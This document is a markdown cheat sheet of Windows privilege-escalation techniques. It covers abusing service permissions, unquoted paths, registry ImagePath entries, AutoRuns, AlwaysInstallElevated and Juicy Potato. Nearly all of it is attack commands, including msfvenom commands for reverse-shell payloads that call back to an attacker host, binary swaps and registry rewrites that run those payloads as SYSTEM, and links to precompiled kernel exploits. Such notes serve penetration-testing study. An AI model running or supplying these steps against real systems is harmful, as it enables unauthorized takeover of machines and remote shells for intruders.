# Windows privilege escalation

## Services
Prior to trying these, ensure you have the old `accesschk.exe` binary that allows passing the `/accepteula` option, and that you have created a reverse shell payload using
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f exe -o reverse.exe` or equivalent based on the architecture.
(Don't forget to setup your netcat listener).

`.\winPEASany.exe quiet servicesinfo`

### Insecure Service Permissions
If you are able to modify a service that runs as system and start/stop the service, you may be able to escalate privileges by modifying the binpath of the service.
You have the required permission if `accesschk.exe /accepteula -uecqv user <service-name>` returns
`SERVICE_CHANGE_CONFIG`, `SERVICE_START` and `SERVICE_STOP`. Be sure to use the old accesschk as the new version doesn't allow accept the EULA using a command line option.

You can check if a service runs as system by running `sc qc <service-name` and checking the `SERVICE_START_NAME`.
Create a reverse shell using `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=<target-port> -f exe -o reverse.exe`.
Then modify the binpath with `sc config <service-name> binpath="\"C:\Path\to\reverse.exe\""`.
Open a netcat listener on kali and then stop/start the service on the windows target with `net stop <service-name>`, `net start <service-name`.

### Unquoted Service Path
If a path to a service contains spaces with no quotes, and you are able to write to one of the folders on the path:
* Check `acesschk.exe /accepteula -ucqv <user-name> <service-name>` contains `SERVICE_START`
* `sc qc <service-name>` to get the `BINARY_PATH_NAME`
* `.\accesschk.exe /accepteula -uwdq "C:\Path To\Service" for each folder in the path and check if the group our user is in has write privilege to any folders
* Assuming path is `"C:\Program Files\Unquoted Path Service\Common Files\service.exe"` and we can write to `"C:\Program Files\Unquoted Path Service\` copy the reverse shell `copy C:\PathTo\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe`
* `net start <service-name>`

### Weak Registry Permissions
If we can modify the registry entry for a service that runs as system:
* `sc qc regsvc` (check `SERVICE_START_NAME` and `BINARY_PATH_NAME`)
* `.\accesschk.exe /accepteula -ucqv <user> <service-name>` (look for `SERVICE_START`)
* `reg query HKLM\SYSTEM\path\to\service-name` (check `ImagePath` and `ObjectNme`)
* `reg add HKLM\SYSTEM\path\to\service-name` /v ImagePath /t REG_EXPAND_SZ /d C:\Path\To\reverse.exe`
* `net start regsvc`

### Insecure Service Executables
If winpeas or `.\acceschk.exe /accepteula -quvw "C:\Path\To\service.exe" indicates we have `FILE_ALL_ACCESS`,
and `.\accesschk.exe /accepteula -uvqc <service-name>` indicates we cat start/stop the service:
* `copy C:\Path\To\reverse.exe "C:\Path\To\service.exe" /Y`
* `net start <service>`

## Registry

### AutoRuns
`.\winPEASany.exe quiet applicationsinfo`

* `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` (check for autorun executables)
* `.\accesschk.exe /accepteula -wvu "C:\Path\to\program.exe` (check if any are writable by us)
* `copy C:\Path\To\reverse.exe "C:\Path\To\Writable\program.exe" /Y`
* wait for restart/login

### AlwaysInstallElevated
`.\winPEASany.exe quiet windowscreds` 

If both of

```cmd
reg query HKCY\SOFTWARE\Policies\Microsoft\windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\windows\Installer /V AlwaysInstallelevated
```

are set to `0x1`:

* `msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI_IP LPORT=$PORT -f msi -o reverse.msi`
* `msiexec /quiet /qn /i C:\Path\To\reverse.msi`

## Kernel Exploits
Exploit suggester: `https://github.com/bitsadmin/wesng`  
Precompiled exploits: `https://githb.com/SecWiki/windows-kernel-exploits`

## Juicy potato
If `whoami /priv` indicates the current user has the `SeImpersonate` or `SeAssignPrimaryToken` privileges, then you can use
[juicy potato](https://github.com/ohpe/juicy-potato) to obtain a root shell.
